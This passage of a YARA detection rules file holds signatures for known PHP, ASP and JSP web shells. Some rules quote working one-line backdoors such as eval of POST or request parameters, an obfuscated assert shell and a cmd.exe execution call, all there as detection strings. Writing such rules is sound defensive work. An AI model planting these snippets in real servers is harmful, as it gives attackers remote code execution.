		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
		logic_hash = "3c6904fa475784e737275fd47eabea077bed57e920071c68fa09f7defecbdb72"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpshell_2_1_Config {
    meta:
		description = "Web Shell - file config.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L378-L391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bd83144a649c5cc21ac41b505a36a8f3"
		logic_hash = "51d16bcaef5f6795ebcd1154dca79d5cf5a389948b0e59f4939c30fef877e816"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_EFSO_2 {
    meta:
		description = "Web Shell - file EFSO_2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L392-L405"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		logic_hash = "19bd00fabe0b4695129c180dd145e757e0b2c2a6dad751e8c889222c191e03ce"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Up {
    meta:
		description = "Web Shell - file up.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L406-L419"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "515a5dd86fe48f673b72422cccf5a585"
		logic_hash = "77c8121d000c45e44717689dec535fde7c9722005d1e4ff40d0b84abcf289f47"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Networkfilemanagerphp {
    meta:
		description = "Web Shell - file NetworkFileManagerPHP.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L420-L433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
		logic_hash = "235e4062a9b9ebdf7dd0b8a2cb3b16ba7688a75b90d8c527344cf9605304838d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Server_Variables {
    meta:
		description = "Web Shell - file Server Variables.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L434-L448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "47fb8a647e441488b30f92b4d39003d7"
		logic_hash = "2a85301f1d6e4c457ff0a1b2a08eb6f054905993a0667087f37b9a7352e38911"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
		$s9 = "Variable Name</B></font></p>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Caidao_Shell_Ice_2 {
    meta:
		description = "Web Shell - file ice.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L449-L462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1d6335247f58e0a5b03e17977888f5f2"
		logic_hash = "57c3c369abd826d676290300d8df2d890b777fa1f0e1156654062159a4228db7"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Caidao_Shell_Mdb {
    meta:
		description = "Web Shell - file mdb.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L463-L476"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fbf3847acef4844f3a0d04230f6b9ff9"
		logic_hash = "89f7692acd754992f9379b9b4661a01d6ab95cb85a3c2699928aa5ed3a3ac8c5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<% execute request(\"ice\")%>a " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Guige {
    meta:
		description = "Web Shell - file guige.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L477-L490"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2c9f2dafa06332957127e2c713aacdd2"
		logic_hash = "9d71095b5c709dfdd8b5fcebcaa4493d9c93e841e85cda2e2255e0c15ea83659"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpspy2010 {
    meta:
		description = "Web Shell - file phpspy2010.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L491-L506"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "14ae0e4f5349924a5047fed9f3b105c5"
		logic_hash = "b3acef196b30cf9afe24c81860bedff69fc5652c514aa36aba85d16b12bcc432"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "eval(gzinflate(base64_decode("
		$s5 = "//angel" fullword
		$s8 = "$admin['cookiedomain'] = '';" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Ice {
    meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L507-L520"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d141e011a92f48da72728c35f1934a2b"
		logic_hash = "524419e802d3cb6ac310565af22ec28044984aa4b1b2ee1cfbd292afd071709c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Drag_System {
    meta:
		description = "Web Shell - file system.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L521-L534"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "15ae237cf395fb24cf12bff141fb3f7c"
		logic_hash = "8ea8d9d64521f47f1396e4f4d6c8f4a71fa1a643799ec408e1d2e0f255dc4996"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Darkblade1_3_Asp_Indexx {
    meta:
		description = "Web Shell - file indexx.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L535-L548"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b7f46693648f534c2ca78e3f21685707"
		logic_hash = "57cfe09d53d42ee9d909a3894b8a3362209c1972c7d96ae5fdc61681c2998a89"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpshell3 {
    meta:
		description = "Web Shell - file phpshell3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L549-L564"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "76117b2ee4a7ac06832d50b2d04070b8"
		logic_hash = "868b1b69fab3ec6fcfa15557075f313f4af0ec9cd15f41bb9dcc9bc26fc17f93"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
		$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
		$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Hsxa {
    meta:
		description = "Web Shell - file hsxa.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L565-L578"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
		logic_hash = "7f79b66d87f638bc09ee576de4dc4a8c5b1da7c406d318eeff7a4221c35d2313"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Utils {
    meta:
		description = "Web Shell - file utils.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L579-L593"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9827ba2e8329075358b8e8a53e20d545"
		logic_hash = "90a5b64e59306bdffc5a89f5d86a2dc7a17669021d863e2a5ecea13d65c19053"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_01 {
    meta:
		description = "Web Shell - file 01.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L594-L607"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "61a687b0bea0ef97224c7bd2df118b87"
		logic_hash = "e057800013a9a8f4c3ecbe4e27c14e904700548e6ad9dc1f00313c7a3de7fd2d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%eval request(\"pass\")%>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_404 {
    meta:
		description = "Web Shell - file 404.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L608-L621"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d9fa1e8513dbf59fa5d130f389032a2d"
		logic_hash = "3db951af36ed3d08bc10b4c3fc2e67481f005580fb76f66b6ec5789ed6e2efdb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshell_Cnseay02_1 {
    meta:
		description = "Web Shell - file webshell-cnseay02-1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L622-L635"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "95fc76081a42c4f26912826cb1bd24b1"
		logic_hash = "9950fb7c26dfb25665093dbcf5c4a9dcf65466783509a3caa11c2c96d177d855"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Fbi {
    meta:
		description = "Web Shell - file fbi.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L636-L649"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1fb32f8e58c8deb168c06297a04a21f1"
		logic_hash = "de8584ae83ee3e23f4ce00ccd73f75b4568d6a4544af45b83784a9a0c34d42e3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_B374Kphp_B374K {
    meta:
		description = "Web Shell - file B374k.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L650-L666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bed7388976f8f1d90422e8795dff1ea6"
		logic_hash = "1f0fc5e309dd67a11d6ba9b698fd9ca3c7e6616545c220de79aaa3b63f0ad931"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Http://code.google.com/p/b374k-shell" fullword
		$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
		$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
		$s4 = "B374k Vip In Beautify Just For Self" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Cmd_Asp_5_1 {
    meta:
		description = "Web Shell - file cmd-asp-5.1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L667-L680"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "1ff4ae8c08cec4605594e97d6c077d4808d3a73c04ddf6a51952252dd2d01cf4"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Dodo_Zip {
    meta:
		description = "Web Shell - file zip.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L681-L695"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b7800364374077ce8864796240162ad5"
		logic_hash = "bdeffafdedeadaba36c5c67f981c42d6111b954622780b930e9eeb9956c638b5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
		$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0 {
    meta:
		description = "Web Shell - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L696-L710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "d0ccf9e37e378db4523d7918b30cff358115e7a4c36fad55a75f3aff218563c6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
		$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_List {
    meta:
		description = "Web Shell - file list.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L711-L726"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "922b128ddd90e1dc2f73088956c548ed"
		logic_hash = "007f9307493bca71dcbdcf6ba6c45bf36899e8f636ccbd09c26453cb0aea0847"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// list.php = Directory & File Listing" fullword
		$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
		$s9 = "// by: The Dark Raver" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Ironshell {
    meta:
		description = "Web Shell - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L727-L741"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "7e4916010a33383cfc3cbbcd5d575ac2f3a579220b66bd07e3121f3db30da66d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
		$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Caidao_Shell_404 {
    meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L742-L755"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
		logic_hash = "0743d18bc5066c96cca8cc0883971d3bc876e6c2fbb996e55b6930c715e07395"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_ASP_Aspydrv {
    meta:
		description = "Web Shell - file aspydrv.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L756-L769"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "de0a58f7d1e200d0b2c801a94ebce330"
		logic_hash = "a4a6205ace49778ddc421b0f0e65c576e2ffe40ce2ab84debb939d5324420405"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Web {
    meta:
		description = "Web Shell - file web.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L770-L783"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
		logic_hash = "ed0ace0ba5f8a9e763353c42e3e3a39da10596e8517aad33e5c5080b44e4d61a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Mysqlwebsh {
    meta:
		description = "Web Shell - file mysqlwebsh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
